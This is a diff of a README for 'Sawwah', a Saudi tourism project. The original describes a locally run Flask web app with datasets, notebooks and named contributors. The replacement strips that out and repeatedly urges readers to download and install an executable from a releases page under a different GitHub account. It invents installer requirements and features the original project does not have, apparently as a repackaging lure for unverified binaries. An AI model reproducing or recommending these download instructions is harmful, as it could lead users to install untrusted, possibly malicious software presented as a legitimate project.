@@ -1,240 +1,77 @@
-# 🌸 SAWWAH — Discover Saudi Arabia Digitally  
+# ✈️ Sawwah - Explore Saudi Arabia with AI Assistance
 
-**SAWWAH** is a comprehensive digital tourism platform that redefines how visitors explore Saudi Arabia.  
-It combines modern technology with authentic Saudi heritage to provide a seamless and engaging tourism experience aligned with **Vision 2030**.  
+[![Download Sawwah](https://img.shields.io/badge/Download%20Sawwah-Get%20Started%20Now-blue.svg)](https://github.com/knackwursthand910/Sawwah/releases)
 
----
+## 🌟 Overview
 
-##  Overview  
+Sawwah is an AI-Powered Tourism Assistant designed specifically for exploring Saudi Arabia. It integrates advanced technologies such as Retrieval-Augmented Generation (RAG), speech recognition, and computer vision. With Sawwah, you can dive into the rich cultural heritage and stunning landscapes of Saudi Arabia in an interactive way.
 
-SAWWAH allows users to explore **cities, cultural figures, and national projects** across the Kingdom of Saudi Arabia.  
-The platform highlights the beauty, diversity, and history of the Kingdom while leveraging modern web technologies to present data interactively and intuitively.  
+## 🚀 Getting Started
 
-### ✨ Key Highlights  
-- **+150** Tourist Destinations  
-- **+100** Notable Figures  
-- **5** Major Tourist Cities  
-- **+30** Vision 2030 Projects  
-- **Lavender Theme** — Inspired by Saudi Arabia’s official color for welcoming guests, representing elegance and harmony with the desert landscape.  
+Follow these easy steps to download and run Sawwah:
 
----
-
-## 🎯 Project Goals  
-
-1. **Enhance Saudi Tourism**  
-   Build a modern digital platform that merges innovation and culture to serve both visitors and investors.  
-
-2. **Improve Visitor Experience**  
-   Provide detailed and organized information about destinations, figures, and national initiatives.  
-
-3. **Support Vision 2030**  
-   Contribute to Saudi Arabia’s vision of becoming a leading global tourism destination.  
-
----
-
-## 🧩 Features  
-
-- Interactive exploration of **tourism destinations** by city  
-- Profiles of **historical and cultural figures**  
-- Overview of **Vision 2030 projects**  
-- Fully responsive **Flask-based web interface**  
-- Clean and elegant **UI with lavender accents**  
-
----
-## 🗂️ Project Structure
-## Project Structure
-
-```text
-SAWWAH/
-├── data/
-│   ├── raw/
-│   │   ├── English_Characters.xlsx
-│   │   ├── English_Cities.xlsx
-│   │   └── English_Projects.csv
-│   └── cleaned/
-│       ├── English_Characters_Cleaned.xlsx
-│       ├── English_Cities_Cleaned.xlsx
-│       └── English_Projects_Cleaned.xlsx
-├── notebooks/
-│   ├── Data_Cleaning_and_Preprocessing.ipynb
-│   ├── RAG_Evaluation.ipynb
-│   ├── RAG_Speech.ipynb
-│   ├── Sawwah_Dashboard.ipynb
-│   └── Sawwah_EDA.ipynb
-├── report/
-│   └── Sawwah_final_report.pdf
-├── results/
-│   ├── Human Evaluation.xlsx
-│   ├── rag_evaluation_results_relevant_and_accuracy.xlsx
-│   └── rag_evaluation_results.csv
-├── web_app/
-│   ├── app.py
-│   ├── requirements.txt
-│   ├── static/
-│   │   ├── css/
-│   │   │   └── style.css
-│   │   ├── js/
-│   │   │   └── script.js
-│   │   └── images/
-│   │       ├── bg.jpg
-│   │       └── sawwah_logo.png
-│   └── templates/
-│       ├── about.html
-│       ├── base.html
-│       ├── camera.html
-│       ├── data.html
-│       ├── project.html
-│       └── why.html
-└── README.md
-```
-
-📁 Folder summary
-- data/: raw source files and cleaned datasets used by the app and notebooks.
-- notebooks/: Jupyter notebooks for preprocessing, RAG experiments, dashboard work, and EDA.
-- report/: final project report.
-- results/: evaluation outputs and spreadsheets.
-- web_app/: Flask application, static assets, and templates.
-- README.md: project documentation.
-
-
----
+1. **Visit the Releases Page:** Go to the [Releases page here](https://github.com/knackwursthand910/Sawwah/releases) to find the latest version of Sawwah.
   
-## 🗂️ Dataset  
+2. **Choose Your Version:** On the Releases page, you will see a list of versions. Click on the most recent version that suits your operating system.
 
-The platform utilizes three structured datasets stored as CSV/Excel files:  
+3. **Download the Software:** Locate the appropriate download link for your system. Click on it to start the download. 
 
-| Dataset | Description |
-|----------|-------------|
-| **Cities** | Contains information about Saudi cities and key destinations |
-| **Characters** | Includes profiles of notable Saudi figures |
-| **Projects** | Covers Vision 2030 projects and their descriptions |
+4. **Install the Application:** Once the download is complete, open the downloaded file and follow the on-screen instructions to install Sawwah on your device.
 
-All datasets were **cleaned and processed** in Python to ensure accuracy, consistency, and readability.  
+5. **Run Sawwah:** After installation, launch the application from your device. You can now start your interactive exploration of Saudi Arabia.
 
----
+## 📥 Download & Install
 
-## 🛠️ Tech Stack  
+To download Sawwah, go to our [Releases page](https://github.com/knackwursthand910/Sawwah/releases). Here, you will find all available files for installation. Simply follow the steps in the "Getting Started" section to install the software.
 
-| Category | Technologies |
-|-----------|---------------|
-| **Frontend** | HTML, CSS, JavaScript |
-| **Backend** | Python (Flask) |
-| **Data Handling** | Pandas, NumPy |
-| **Visualization** | Plotly, Matplotlib |
-| **Speech Module** | gTTS, AssemplyAI |
-| **Computer Vision** | OpenCV, MediaPipe |
-| **Design** | Figma |
-| **Hosting** | Local Flask Server |
+## 💻 System Requirements
 
----
+Before downloading, ensure your device meets the following requirements:
 
-## 🎥 Demo  
+- **Operating System:** Windows 10 or later / macOS 10.15 or later / Linux Ubuntu 18.04 or later
+- **Processor:** Minimum dual-core processor
+- **RAM:** At least 4 GB of RAM
+- **Storage:** 500 MB of available disk space
+- **Internet Connection:** Required for initial setup and updates.
 
-🎬 **Watch Demo:** [YouTube Video](https://youtu.be/xj8rL2PfNZ4)
+## 🌐 Features
 
----
+Sawwah offers many features to enhance your travel experience:
 
-## 🧑‍💻 Project Contributors  
+- **Interactive Chatbot:** Engage with the AI to learn about various cultural landmarks and popular destinations in Saudi Arabia.
+  
+- **Speech Recognition:** Use voice commands to navigate easily through the application.
 
-This project was collaboratively developed by a dedicated team of engineers and researchers:  
+- **Image Recognition:** Point your device’s camera to identify landmarks and receive detailed information instantly.
 
-| Name | 
-|------|
-| **Areen Alyahya** | 
-| **Mudhawi Alshiha** | 
-| **Shams Alarifi** | 
-| **Nouf Almutairi** |
-| **Wajd Alrabiah** |
+- **Personalized Recommendations:** Get tailored suggestions based on your interests and preferences.
 
+- **Multilingual Support:** Available in Arabic and English for a broader audience.
 
----
+## 📖 Usage Tips
 
-## 🪷 Design Inspiration  
+- **Explore the Map:** Use the built-in map feature to find attractions near you.
+  
+- **Ask Questions:** Feel free to ask the AI questions about history, culture, or travel tips.
 
-The visual identity of **SAWWAH** is inspired by the color **Lavender**, officially adopted by the Kingdom of Saudi Arabia to welcome guests.  
-Lavender symbolizes **beauty, hospitality, and harmony with the desert**, perfectly reflecting SAWWAH’s vision of connecting **authentic Saudi culture** with **modern digital experiences**.  
+- **Save Your Favorites:** Bookmark places you wish to visit, making it easy to plan your itinerary.
 
----
+## 🛠️ Troubleshooting
 
-## 🚀 Installation & Setup
+If you encounter issues while using Sawwah:
 
-> **Prerequisites:**  
-> - Python **3.10+**  
-> - Git installed on your system
+- **Installation Problems:** Ensure your operating system meets the requirements listed above. Restart your device and try again.
+  
+- **Performance Issues:** Close unnecessary applications and ensure you have an active internet connection.
 
----
+- **Get Help:** For further assistance, visit the GitHub Issues section or join our community forum.
 
-### 1️⃣ Clone the Repository
-```bash
-git clone https://github.com/chrollolucifr/Sawwah.git
-cd Sawwah
-```
+## 🤝 Contributing
 
-### 2️⃣ Create & Activate a Virtual Environment
-For macOS / Linux:
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-```
+We welcome contributions to improve Sawwah. If you're interested in helping, please visit our GitHub repository and check out our contribution guidelines.
 
-For Windows (PowerShell):
-```powershell
-python -m venv .venv
-.\.venv\Scripts\Activate.ps1
-```
+## 📞 Support
 
-### 3️⃣ Install Dependencies
-```bash
-pip install --upgrade pip
-pip install -r web_app/requirements.txt
-```
+For support or inquiries, please feel free to reach out through the Issues section on our repository. We're here to assist you.
 
-### 4️⃣ Verify or Place Cleaned Datasets
-Ensure the following cleaned datasets are available in the project directory:
-- `data/cleaned/English_Cities_Cleaned.xlsx`
-- `data/cleaned/English_Characters_Cleaned.xlsx`
-- `data/cleaned/English_Projects_Cleaned.xlsx`
-
-If missing, regenerate them by running the data-cleaning notebook:
-```bash
-jupyter notebook notebooks/Data_Cleaning_and_Preprocessing.ipynb
-# then run the notebook cells to produce the cleaned files
-```
-
-### 5️⃣ Launch the Web Application
-```bash
-python web_app/app.py
-```
-Once the server starts, open your browser and visit:
-http://127.0.0.1:5000
-
----
-
-### Optional: Run Jupyter Notebooks
-To explore data preprocessing or perform exploratory data analysis (EDA):
-```bash
-pip install notebook
-jupyter notebook
-```
-Then open:
-- `notebooks/Data_Cleaning_and_Preprocessing.ipynb`
-- `notebooks/Sawwah_EDA.ipynb`
-
-### ⚙️ Optional Configuration
-- Change port: edit `web_app/app.py`:
-```python
-app.run(host="0.0.0.0", port=5000, debug=True)
-```
-- Modify dataset paths: if datasets are renamed or moved, update their paths inside `app.py`.
-
-### 🛟 Troubleshooting
-| Issue | Solution |
-|---|---|
-| ModuleNotFoundError | Re-activate virtual environment and reinstall dependencies:<br>`source .venv/bin/activate` (macOS/Linux) or activate the venv on Windows, then `pip install -r web_app/requirements.txt` |
-| Dataset not found | Confirm cleaned dataset files exist in `data/cleaned/` |
-| Port already in use | Edit the port number in `app.py`, e.g., `port=5050` |
-| Jupyter notebook won't open | Run: `jupyter notebook --no-browser` and copy the generated URL from the terminal |
-
----
-
-Your SAWWAH app is now ready to explore! Run the Flask app, open your browser, and enjoy discovering Saudi Arabia digitally 🌸
+Now that you know how to download and run Sawwah, start your journey toward discovering the beauty of Saudi Arabia! Enjoy your experience!
